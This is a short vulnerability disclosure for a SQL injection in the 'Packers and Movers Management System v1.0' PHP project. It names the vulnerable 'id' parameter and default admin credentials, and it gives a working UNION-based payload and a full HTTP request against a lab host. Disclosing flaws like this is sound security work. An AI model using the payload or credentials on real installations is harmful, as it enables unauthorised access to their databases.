# Packers and Movers Management System v1.0 by oretnom23 has SQL injection

BUG_Author: geilihan

vendors: https://www.sourcecodester.com/php/15360/packers-and-movers-management-system-phpoop-free-source-code.html

Vulnerability File: /mpms/admin/?page=user/manage_user&id=

Vulnerability location: /mpms/admin/?page=user/manage_user&id=, id

username:password : admin:admin123

[+] Payload: /mpms/admin/?page=user/manage_user&id=-7' union select 1,2,database(),4,5,6,7,8,9,10,11--+ // Leak place ---> id

```sql
GET /mpms/admin/?page=user/manage_user&id=-7%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=c01he3spaa8msq4609rs8bml47
Connection: close
```

